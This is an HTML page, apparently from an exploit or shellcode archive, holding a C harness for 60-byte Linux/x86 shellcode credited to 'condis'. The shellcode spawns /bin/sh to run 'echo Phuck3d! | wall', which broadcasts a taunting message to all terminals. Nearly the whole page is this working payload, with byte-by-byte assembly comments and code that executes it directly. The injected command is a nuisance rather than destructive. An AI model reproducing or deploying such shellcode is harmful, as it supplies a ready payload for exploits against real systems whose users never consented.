<html><head><title>Linux/x86 - sends Phuck3d! to all terminals - 60 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 
$Id: where-is-wallie.c, v 1.0 2010/04/24 18:32:29 condis Exp $
 
linux/x86 sends &quot;Phuck3d!&quot; to all terminals (60 bytes) shellcode
by condis
 
Tested on: Linux Debian
 
*/
 
int main(void)
{
    char evil[] =  
 
        &quot;\x6a\x0b&quot;              // push   $0xb
        &quot;\x58&quot;                  // pop    %eax
        &quot;\x99&quot;                  // cltd
        &quot;\x52&quot;                  // push   %edx
        &quot;\x68\x77\x61\x6c\x6c&quot;  // push   $0x6c6c6177
        &quot;\x68\x21\x20\x7c\x20&quot;  // push   $0x207c2021
        &quot;\x68\x63\x6b\x33\x64&quot;  // push   $0x64336b63
        &quot;\x68\x20\x50\x68\x75&quot;  // push   $0x75685020
        &quot;\x68\x65\x63\x68\x6f&quot;  // push   $0x6f686365
        &quot;\x89\xe6&quot;              // mov    %esp,%esi
        &quot;\x52&quot;                  // push   %edx
        &quot;\x66\x68\x2d\x63&quot;      // pushw  $0x632d
        &quot;\x89\xe1&quot;              // mov    %esp,%ecx
        &quot;\x52&quot;                  // push   %edx
        &quot;\x68\x2f\x2f\x73\x68&quot;  // push   $0x68732f2f
        &quot;\x68\x2f\x62\x69\x6e&quot;  // push   $0x6e69622f
        &quot;\x89\xe3&quot;              // mov    %esp,%ebx
        &quot;\x52&quot;                  // push   %edx
        &quot;\x56&quot;                  // push   %esi
        &quot;\x51&quot;                  // push   %ecx
        &quot;\x53&quot;                  // push   %ebx
        &quot;\x89\xe1&quot;              // mov    %esp,%ecx
        &quot;\xcd\x80&quot;              // int    $0x80
 
 
    void(*boom)()=(void*)evil;
    boom();
 
    return 0;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
